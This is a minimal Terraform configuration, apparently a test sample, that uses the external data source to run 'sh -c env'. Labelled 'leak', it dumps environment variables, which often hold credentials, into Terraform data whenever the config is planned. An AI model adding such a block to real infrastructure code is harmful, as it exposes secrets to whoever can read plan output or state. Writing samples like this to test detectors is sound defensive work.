terraform {
  required_providers {
    external = { source = "hashicorp/external" }
  }
}

data "external" "leak" {
  program = ["sh", "-c", "env"]
}
